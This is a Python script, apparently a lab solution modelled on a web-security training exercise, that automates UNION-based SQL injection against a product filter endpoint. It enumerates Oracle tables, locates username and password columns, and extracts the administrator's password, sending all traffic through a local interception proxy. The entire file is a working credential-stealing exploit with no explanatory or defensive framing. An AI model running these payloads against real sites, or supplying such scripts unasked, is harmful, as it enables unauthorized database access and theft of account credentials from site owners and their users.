import requests
import urllib3
import sys
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def perform_request(url, payload):
    uri = '/filter?category=Pets'
    r = requests.get(url + uri + payload, verify=False, proxies=proxy)
    res = r.text
    return res

def SQli_table_name(url):
    payload = "' UNION SELECT table_name, NULL FROM all_tables --"
    res = perform_request(url, payload)
    soup = BeautifulSoup(res, 'html.parser')
    table_name = soup.find(text= re.compile('^USERS.*'))
    if table_name is None:
        return False
    else:
        return table_name

def SQli_user_columns(url, table_name):
    payload = "'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'--" % table_name
    res = perform_request(url, payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text= re.compile('^USERNAME.*'))
    password_column = soup.find(text= re.compile('^PASSWORD.*'))
    if username_column and password_column is None:
        return False
    else:
        return username_column , password_column

def SQLi_admin_cred(url, table_name, username_column, password_colmun):
    payload = "' UNION SELECT %s , %s FROM %s--" %(username_column, password_colmun, table_name)
    res = perform_request(url, payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_cred = soup.find(text='administrator').parent.findNext('td').contents[0]
    if admin_cred is None:
        print("[-] Couldn't retrieve the admin cred ")
    else:
        return admin_cred

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)

    print("[+] Looking for Table name...")
    table_name = SQli_table_name(url)
    if table_name :
        print("[+] The table name is %s" %table_name )
        print("[+] Looking for username and password columns...")
        username_column, password_column = SQli_user_columns(url, table_name)
        if username_column and password_column:
            print("[+] The username columns is %s " %username_column)
            print("[+] The password columns is %s " %password_column)
            print("[+] Looking for admin's creds ...")
            admin_cred = SQLi_admin_cred(url, table_name, username_column, password_column)
            if admin_cred :
                print("[+] The administrator password is %s" % admin_cred)
            else:
                print("Couldn't retrieve admin's cred")
        else:
            print("Couldn't retrieve Username and Password columns")

    else:
        print("Couldn't retrieve the table name")
